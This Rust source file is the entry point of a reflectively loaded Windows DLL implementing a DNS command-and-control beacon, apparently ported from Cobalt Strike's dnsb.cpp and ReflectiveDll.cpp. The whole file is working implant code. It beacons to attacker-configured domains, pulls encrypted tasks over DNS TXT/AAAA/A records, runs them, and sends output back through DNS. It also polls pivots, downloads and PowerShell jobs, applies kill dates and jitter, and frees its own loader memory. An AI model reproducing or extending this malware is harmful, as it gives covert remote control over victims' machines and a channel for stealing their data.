//! DNS Beacon DLL 入口（对应 dnsb.cpp + ReflectiveDll.cpp）。
//! DNS Beacon DLL entry (mirrors dnsb.cpp + ReflectiveDll.cpp).

//! `adjust`/`length` 循环变量与 `shell_callback` 镜像严格遵循 C++ 入口点。
//! The `adjust`/`length` loop variables and `shell_callback`
//! mirrors follow the C++ entry points verbatim.
#![allow(unused_assignments)]
#![allow(dead_code)]

use beacon_core::beacon::{
    SETTING_DNS_BEACON_BEACON, SETTING_DNS_BEACON_PUT_METADATA,
    SETTING_DNS_BEACON_PUT_OUTPUT, SETTING_DNS_IDLE, SETTING_DOMAINS, SETTING_JITTER,
    SETTING_MAXGET, SETTING_PORT, SETTING_SLEEPTIME,
};
use beacon_core::callback::{command_shell_encrypt, register_command_shell_post};
use beacon_core::channel_tcp::{channel_lookup, dns_get, dns_get6, dns_get_txt, dns_put, set_max_dns};
use beacon_core::commands::{
    bad_watermark, bad_watermark_hash, check_kill_date, command_die,
};
use beacon_core::files::download_poll;
use beacon_core::link::link_poll;
use beacon_core::jobs::psh_poll;
use beacon_core::metadata::agent_init;
use beacon_core::pivot::pivot_poll;
use beacon_core::proto::process_payload;
use beacon_core::security::security_decrypt;
use beacon_core::settings::{setting_int, setting_ptr, setting_short, settings_init};
use beacon_core::state;
use beacon_core::strategy::{check_max_retry, next_host, strategy_setup, StrategyInfo};
use beacon_core::thread::safe_exit;
use beacon_core::gargle::gargle_sleep;

const DLL_METASPLOIT_ATTACH: u32 = 0x04;

/// 通过 DNS 发送加密并封装好的响应。
/// Sends an encrypted+packaged response via DNS.
fn shell_post(buffer: &[u8], length: usize, type_: i32, _send_now: bool) {
    let Some(cipherdata) = command_shell_encrypt(buffer, length, type_) else {
        return;
    };
    let putoutput = state::DNSBEACON_PUTOUTPUT.lock().clone();
    let post_url = state::POST_URL.lock().clone();
    dns_put(&putoutput, &post_url, &cipherdata, cipherdata.len());
}

fn shell_callback(buffer: &[u8], length: i32, type_: i32) {
    shell_post(buffer, length as usize, type_, false);
}

fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
    let mut beacon_domain = vec![0u8; 128];
    let mut adjust: u32 = 0;
    let mut signal: u32 = 0;
    let mut failed_host = false;

    let hosts = setting_ptr(SETTING_DOMAINS).unwrap_or(b"").to_vec();
    let _port = setting_short(SETTING_PORT);
    let sleep_time_setting = setting_int(SETTING_SLEEPTIME);
    let dnsidle = setting_int(SETTING_DNS_IDLE);

    let dnsbeacon_beacon = setting_ptr(SETTING_DNS_BEACON_BEACON).unwrap_or(b"").to_vec();
    let dnsbeacon_putmetadata = setting_ptr(SETTING_DNS_BEACON_PUT_METADATA).unwrap_or(b"").to_vec();
    {
        let mut po = state::DNSBEACON_PUTOUTPUT.lock();
        *po = setting_ptr(SETTING_DNS_BEACON_PUT_OUTPUT).unwrap_or(b"").to_vec();
    }

    let mut strategy_info = StrategyInfo {
        strategy: 0,
        rotation_timer: 0,
        failover_timer: 0,
        failover_maxfail: 0,
    };
    strategy_setup(
        &mut strategy_info,
        setting_short(beacon_core::beacon::SETTING_DOMAIN_STRATEGY) as i32,
        setting_int(beacon_core::beacon::SETTING_DOMAIN_STRATEGY_SECONDS) as i32,
        setting_int(beacon_core::beacon::SETTING_DOMAIN_STRATEGY_FAIL_SECONDS) as i32,
        setting_int(beacon_core::beacon::SETTING_DOMAIN_STRATEGY_FAIL_X) as i32,
    );

    if check_kill_date() || bad_watermark() || bad_watermark_hash() {
        safe_exit();
        return;
    }

    state::set_sleep_time(sleep_time_setting);
    state::set_jitter(setting_short(SETTING_JITTER) as u32);

    let mut buffer = vec![0u8; setting_int(SETTING_MAXGET) as usize];
    let buffer_len = buffer.len();
    agent_init(&mut buffer, buffer_len);

    let mut max_retry_count: i32 = 0;
    let mut max_orig_sleep_time: u32 = 0;

    while state::sleep_time() > 0 {
        // 设置我们回连 beacon 的方式
        // setup how we're going to beacon back
        let mut post_url: Vec<u8> = Vec::new();
        post_url.extend_from_slice(format!("{:x}.", state::agentid()).as_bytes());
        if let Some(h) = next_host(&hosts, failed_host, &strategy_info) {
            post_url.extend_from_slice(&h);
        }
        {
            let mut pu = state::POST_URL.lock();
            *pu = post_url.clone();
        }
        let mut bd: Vec<u8> = Vec::new();
        bd.extend_from_slice(&dnsbeacon_beacon);
        bd.extend_from_slice(&post_url);
        let n = bd.len().min(127);
        beacon_domain[..n].copy_from_slice(&bd[..n]);
        beacon_domain[n] = 0;

        // 跳过内嵌的 URI
        // skip the embedded URI
        failed_host = false;
        let _ = next_host(&hosts, failed_host, &strategy_info);

        if channel_lookup(&beacon_domain, &mut signal) {
            // 还原……将 signal 与 dnsidle 异或
            // restore... xor signal with dnsidle
            signal = signal.to_be() ^ dnsidle;

            if signal == 0x0 {
                // 什么都不做
                // do nothing
            } else if (signal & 0xFFFF_FFF0) == 0xF0 {
                // 根据通道类型设置最大 DNS 长度
                // set our max dns length based on the channel type
                set_max_dns(signal);

                // 信号是否表明需要发送元数据？
                // did the signal indicate that we need to send metadata?
                if (signal & 0x01) == 0x01 {
                    let bs = state::BIGSESSION.lock();
                    let data = bs.data[..bs.length].to_vec();
                    let len = bs.length;
                    drop(bs);
                    dns_put(&dnsbeacon_putmetadata, &post_url, &data, len);
                }

                // 请通过 DNS 获取任务
                // get tasks over DNS plz
                let buffer_len = buffer.len();
                let mut length: i32 = 0;
                if (signal & 0x2) == 0x2 {
                    length = dns_get_txt(&post_url, &mut buffer, buffer_len);
                } else if (signal & 0x4) == 0x4 {
                    length = dns_get6(&post_url, &mut buffer, buffer_len) as i32;
                } else {
                    length = dns_get(&post_url, &mut buffer, buffer_len) as i32;
                }

                // 在处理 payload 之前先解密并校验
                // decrypt and verify the payload before processing it
                if length > 0 {
                    length = security_decrypt(&mut buffer, length as usize);
                    if length > 0 {
                        process_payload(&mut buffer, length as usize);
                    }
                }
            }

            // 检查我们的 pivots、下载、links、powershell
            // check our pivots, downloads, links, powershell
            pivot_poll(shell_callback);
            download_poll(shell_callback, beacon_core::commands::MAX_PACKET_DNS);
            link_poll(shell_callback);
            psh_poll(shell_callback, beacon_core::commands::MAX_PACKET);
        } else {
            // 切换到新的主机
            // move on to a new host
            failed_host = true;
        }

        // 检查终止日期
        // check the kill date
        if check_kill_date() {
            command_die(shell_callback);
        }
        if check_kill_date() {
            safe_exit();
            return;
        }

        // 检查最大重试策略
        // check max retry strategy
        let mut sleep_time = state::sleep_time();
        if check_max_retry(failed_host, &mut max_retry_count, &mut sleep_time, &mut max_orig_sleep_time) {
            safe_exit();
            return;
        }
        state::set_sleep_time(sleep_time);

        // 想睡多久就睡多久
        // sleep for as long as we need to
        let sleep_time = state::sleep_time();
        if sleep_time > 0 {
            let j = state::jitter();
            if j == 0 {
                gargle_sleep(sleep_time);
            } else {
                let sxjd100 = (sleep_time * j) / 100;
                adjust = if sxjd100 > 0 { beacon_core::beacon::bigger_rand() % sxjd100 } else { 0 };
                if adjust < sleep_time {
                    gargle_sleep(sleep_time - adjust);
                } else {
                    gargle_sleep(sleep_time);
                }
            }
        }
    }

    safe_exit();
}

/// DllMain（ReflectiveDll.cpp）。
/// DllMain (ReflectiveDll.cpp).
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    hinst_dll: windows_sys::Win32::Foundation::HINSTANCE,
    dw_reason: u32,
    lp_reserved: *mut core::ffi::c_void,
) -> i32 {
    match dw_reason {
        6 => {}
        1 => {
            settings_init(hinst_dll as usize);
        }
        DLL_METASPLOIT_ATTACH => {
            if setting_short(beacon_core::beacon::SETTING_CLEANUP) == 1 && !hinst_dll.is_null() {
                let mut mbi: windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION =
                    std::mem::zeroed();
                if windows_sys::Win32::System::Memory::VirtualQuery(
                    hinst_dll as *const _,
                    &mut mbi,
                    std::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>(),
                ) != 0
                {
                    if mbi.Type == windows_sys::Win32::System::Memory::MEM_PRIVATE {
                        windows_sys::Win32::System::Memory::VirtualFree(
                            hinst_dll as *mut _,
                            0,
                            windows_sys::Win32::System::Memory::MEM_RELEASE,
                        );
                    } else if mbi.Type == windows_sys::Win32::System::Memory::MEM_MAPPED {
                        windows_sys::Win32::System::Memory::UnmapViewOfFile(windows_sys::Win32::System::Memory::MEMORY_MAPPED_VIEW_ADDRESS { Value: hinst_dll as *mut _ });
                    }
                }
            }
            register_command_shell_post(shell_post);
            beacon_loop(lp_reserved);
        }
        _ => {}
    }
    return 1;
}

/// ReflectiveLoader sled（相当于 ReflectiveLoader.5k，共 5120 字节）。
/// ReflectiveLoader sled (ReflectiveLoader.5k equivalent, 5120 bytes).
#[no_mangle]
pub static ReflectiveLoader: [u8; 5120] = build_sled();

const fn build_sled() -> [u8; 5120] {
    let mut sled = [0u8; 5120];
    let mut i = 0;
    while i < 5120 {
        sled[i] = 0xCC;
        let mut j = 1;
        while j < 8 && i + j < 5120 {
            sled[i + j] = 0x90;
            j += 1;
        }
        i += 8;
    }
    sled
}
